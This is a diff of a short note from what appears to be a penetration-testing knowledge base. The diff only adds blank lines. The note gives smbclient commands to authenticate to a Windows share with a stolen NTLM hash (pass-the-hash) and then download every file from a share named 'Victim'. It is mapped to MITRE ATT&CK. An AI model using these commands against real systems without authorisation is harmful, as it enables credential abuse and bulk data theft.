@@ -32,9 +32,15 @@ This procedure steps through authenticating with a Windows SMB share using an NT
 
 This procedure steps through authenticating with a Windows SMB share using an NTLM hash instead of a password.
 
+
+
 # Instructions
 
 1.  Connect to the SMB. This example uses an NTLM hash for authentication, but if a password is used instead, remove the "--pw-nt-hash" argument and replace "$_NTLM:$_NTLM" with the password.
+
+
+
+
 
 **Command** ([[smbclient Connect to an SMB Share (NTLM)]]):
 
@@ -42,7 +48,15 @@ This procedure steps through authenticating with a Windows SMB share using an NT
 smbclient -U $_USERNAME%$_NTLM_HASH:$_NTLM_HASH --pw-nt-hash //$_TARGET_IP/$_SHARE_NAME
 ```
 
+
+
+
+
 2. Turn on recursion,  turn off prompt, then download all files.
+
+
+
+
 
 **Command** ([[smbclient Download All Files Recursively From SMB]]):
 
@@ -51,6 +65,12 @@ smb: \Victim\> RECURSE ON
 smb: \Victim\> PROMPT OFF
 smb: \Victim\> mget *
 ```
+
+
+
+
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -71,3 +91,5 @@ smb: \Victim\> mget *
 
 - [[data exposure]]
 - [[Network]]
+
+
